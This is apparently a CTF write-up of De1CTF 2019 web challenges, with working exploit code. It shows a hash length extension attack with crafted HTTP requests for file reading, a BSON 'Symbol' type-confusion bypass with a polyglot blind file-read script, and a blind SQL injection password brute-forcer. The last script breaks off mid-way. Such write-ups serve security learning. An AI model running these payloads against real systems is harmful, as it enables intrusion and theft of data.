[TOC]
> 广告一波:  
>
> De1ta长期招Web/逆向/pwn/密码学/硬件/取证/杂项/etc.选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=
# source + exp + wp
# web
## SSRF Me
#### 预期解法:
哈希长度拓展攻击+CVE-2019-9948(urllib)
* * *
#### 题解:
代码很简单,主要是有根据传入的action参数判断,有两种模式,一种是请求Param参数的地址,并把结果写入`result.txt`,另一种是读取`result.txt`的内容,两种方式都需要`sign`值校验.并且`sign`值是通过拼接参数哈希加密,所以可以使用哈希长度拓展攻击.题目给出了`scan`模式的`sign`值.
  1. 获取`scan`模式的`sign`值.
    GET /geneSign?param=local-file:flag.txt HTTP/1.1
    Host: 139.180.128.86
    HTTP/1.1 200 OK
    Server: nginx/1.15.8
    Content-Length: 32
    Connection: close
    51796b52dd6e1108c89b7d5277d3ae0a
  1. 使用`hashpump`生成新的`sign`值.
    $ hashpump
    Input Signature: 51796b52dd6e1108c89b7d5277d3ae0a
    Input Data: local-file:flag.txtscan
    Input Key Length: 16
    Input Data to Add: read
    eafd6ccd634ec29886babc843f1d8b86                                                                                        
    local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read
  1. 把新生成的参数中`\x`替换成`%`,然后提交,即可获取flag
    GET /De1ta?param=local-file:flag.txt HTTP/1.1
    Host: 139.180.128.86
    Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read;sign=eafd6ccd634ec29886babc843f1d8b86
    Connection: close
    HTTP/1.1 200 OK
    Server: nginx/1.15.8
    Content-Type: text/html; charset=utf-8
    Content-Length: 65
    Connection: close
    {"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}"}
由于出题时候的粗心,导致题目产生非预期,太菜了,Orz
## 9calc
#### Part 1
Same to v1 and v2.
#### Part 2
The second task is to bypass RegExp `/^[0-9a-z\[\]\+\-\*\/ \t]+$/`.
Nestjs is a Nodejs Web Framework which is very similar to Spring, and it's
written by TypeScript. However, it's **NOT** Spring. TypeScript is a strongly-typed language, but it's designed for transcompiles to JavaScript so all type
definitions will be removed in runtime. We can just ignore `expression:
string` type hinting and pass an object to `expression`. This time,
`object.toString() === '[object Object]'`.
But we have no way to let `object.toString()` become a useful runnable code ─
if frontend and backends communicate by JSON, it's true. I believe that
everyone has used MongoDB. Nodejs can pass a JavaScript function to MongoDB,
which is not defined in the JSON standard. So they introduce BSON as their
data interchange format. This challenge also used BSON. Luckily, we can
simulate our object to a BSON object in JavaScript.
Let's read `mongodb/js-bson`'s serializer, we can know it detects the object's
type by `Object[_bsontype]` instead of `instanceof`.
    } else if (value['_bsontype'] === 'Binary') {
            index = serializeBinary(buffer, key, value, index, true);
          } else if (value['_bsontype'] === 'Symbol') {
            index = serializeSymbol(buffer, key, value, index, true);
          } else if (value['_bsontype'] === 'DBRef') {
After searching, I found that `Symbol` is the best type to emulate an object
as a string. I checked most of the BSON deserializers and `Symbol.toString()`
always returns the value of the symbol.
So let's build a Symbol like this:
    {"expression":{"value":"1+1","_bsontype":"Symbol"}, "isVip": true}
#### Part 3
Build 3 polyglots in 3 languages to get flag.
#### Exp
    const axios = require('axios')
    const url = 'http://45.77.242.16/calculate'
    const symbols = '0123456789abcdefghijklmnopqrstuvwxyz{}_'.split('')
    const payloads = [
        // Nodejs
        `1 + 0//5 or '''\n//?>\nrequire('fs').readFileSync('/flag','utf-8')[{index}] == '{symbol}' ? 1 : 2;/* '1']);exit;}?>*///'''`,
        // Python
        `(open('/flag').read()[{index}] == '{symbol}') + (str(1//5) == 0) or 2 or ''' #\n))//?>\nfunction open(){return {read:()=>'{flag}'}}function str(){return 0}/* '1']);exit;}?>*///'''`,
        // PHP
        `len('1') + 0//5 or '''\n//?>\n1;function len(){return 1}/* file_get_contents('/flag')[{index}] == '{symbol}' ? "1" : "2"]);exit;}?>*///'''`,
    ]
    const rets = []
    const checkAnswer = (value) => axios.post(url, {
        expression: {
            value,
            _bsontype: "Symbol"
        },
        isVip: true
    }).then(p => p.data.ret === '1').catch(e => {})
    const fn = async () => {
        for (let j = 0; j  {
        console.log(rets.join(''))
    })
#### Others
In this challenge, the BSON part was inspired by the `996Game` of `*CTF2019`.
The code of `996game` is:
    GameServer.loadPlayer = function(socket,id){
      GameServer.server.db.collection('players').findOne({_id: new ObjectId(id)},function(err,doc){
I built `{ toHexString: 'aaa', length: 0, id: {length: 12} }` to bypass the
validation of `ObjectId` because MongoDB Driver used old version `js-bson`.
This maybe useful in MongoDB injection.
## Giftbox
以前 1.0 版本 writeup：
[impakho/ciscn2019_giftbox](https://github.com/impakho/ciscn2019_giftbox)
本题是 2.0 版本。
题目页面类似一个网页沙盒。
在源代码 `main.js` 里找到一个提示，提供了 `otp` 的 `python库` 和 `totp` 的参数，方便写脚本。
同样是 `main.js` 里，可以找到用来生成 `totp` 的 `key` 。
出题人注：服务端时间与客户端时间相差大于 `15秒` ，需要先计算正确的 `totp` 才能调用 `shell.php` 。
查看 `usage.md` 可以看到命令用法， `login` 存在注入，没有过滤，用户名和密码长度限制 `100`。
爆破密码脚本：
    import requests
    import urllib
    import string
    import pyotp
    url = 'http://127.0.0.1/shell.php?a=%s&totp=%s'
    totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
    s = requests.session()
    length = 0
    left = 0x0
    right = 0xff
    while True:
        mid = int((right - left) / 2 + left)
        if mid == left:
            length = mid
            break
        username = "'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))>=%d,1,0)#" % mid
        password = "b"
        payload = 'login %s %s' % (username, password)
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        res = s.get(payload).text
        if 'incorrect' in res:
            left = mid
        else:
            right = mid
    print(length)
    real_password = ''
    for i in range(1, length+1):
        left = 0x20
        right = 0x7e
        while True:
            mid = int((right - left) / 2 + left)
            if mid == left:
                real_password += chr(mid)
                break
            username = "'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))>=%d,1,0)#" % (i, mid)
            password = "b"
            payload = 'login %s %s' % (username, password)
            payload = urllib.quote(payload)
            payload = url % (payload, totp.now())
            res = s.get(payload).text
            if 'incorrect' in res:
                left = mid
            else:
                right = mid
        print(real_password)
        if len(real_password) < i:
            print('No.%d char not in range' % i)
            break
得到密码：`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`
密码里提示有个隐藏命令 `sh0w_hiiintttt_23333` ，可以得到提示 `eval` 在 `launch` 的时候被调用。
`launch` 前需要先用 `targeting` 设置，不过对输入有限制，这里可以 `fuzz` 一下，得知 `code` 限制 `a-zA-Z0-9`
， `position` 限制 `a-zA-Z0-9})$({_+-,.` ，而且两者的长度也有限制。
这里需要用 `php可变变量` 构造和拼接 `payload` 。
构造用来 `getflag` 的 `payload` ，绕过 `open_basedir` 的限制，写个脚本就能 `getflag` 。
`getflag` 脚本：
    import requests
    import urllib
    import string
    import pyotp
    url = 'http://127.0.0.1/shell.php?a=%s&totp=%s'
    totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
    s = requests.session()
    def login(password):
        username = 'admin'